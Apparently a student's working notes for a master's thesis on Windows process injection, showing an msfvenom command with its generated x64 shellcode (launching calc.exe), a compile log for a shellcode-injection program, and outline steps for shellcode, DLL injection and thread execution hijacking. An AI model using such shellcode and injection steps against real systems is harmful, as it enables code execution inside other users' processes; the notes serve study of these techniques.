                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ msfvenom --platform windows --arch x64 -p windows/x64/exec -f c cmd="calc.exe"               

No encoder specified, outputting raw payload
Payload size: 276 bytes
Final size of c file: 1188 bytes
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ 



pau@pau-PC:~/Escritorio/Master/TFM/ScriptsComandos$ x86_64-w64-mingw32-gcc -o ./exec/shellcodeInjection.exe shellcodeInjection.c 
shellcodeInjection.c: In function ‘main’:
shellcodeInjection.c:14:19: warning: initialization of ‘DWORD’ {aka ‘long unsigned int’} from ‘void *’ makes integer from pointer without a cast [-Wint-conversion]
   14 |     DWORD dwPID = NULL, dwTID = NULL;
      |                   ^~~~
shellcodeInjection.c:14:33: warning: initialization of ‘DWORD’ {aka ‘long unsigned int’} from ‘void *’ makes integer from pointer without a cast [-Wint-conversion]
   14 |     DWORD dwPID = NULL, dwTID = NULL;








ejecutar en windows con el PID del proceso que queremos injectar



MODIFICAR EL CODIGO -> AUNQUE DEJARLO LEGIBLE Y ARGUMENTAR EN LA EXPLICACION QUE SE BUSCA LA ESCALADA DE PRIVILEGIOS/PERSISTENCIA, NO LA EVASION










PASOS QUE SIGUE UN ATAUQE DE INYECOIN DE CODIGO ---- TEORIA

1. Attach to, or create a process
2. Allocate some memoty with that process
3. Write the memory to the process
4. Create a thread in the process that will run the code you hve surgically embedded into the process memory


ESTOS PASOS SON TEORICOS, Y SON IGUAL PARA SHELLCODE INJECTION QUE PARA DLL INJECTION




https://www.crow.rip/crows-nest/mal/dev/inject/syscalls
https://www.youtube.com/watch?v=P1PHRcmPM7c&ab_channel=crow


---------------------------------------------------

THREAD EXECUTION HICJACKING
https://www.youtube.com/watch?v=69JINSmgml4&ab_channel=Null

PASOS SEGUN CHAT GPT
Thread Execution Hijacking:

1 .Identificar un hilo en un proceso existente al que se desea inyectar código.
2. Suspender el hilo seleccionado.
3. Reemplazar la memoria del hilo con código malicioso.
4. Reanudar la ejecución del hilo, lo que ejecutará el código malicioso en el contexto del proceso.
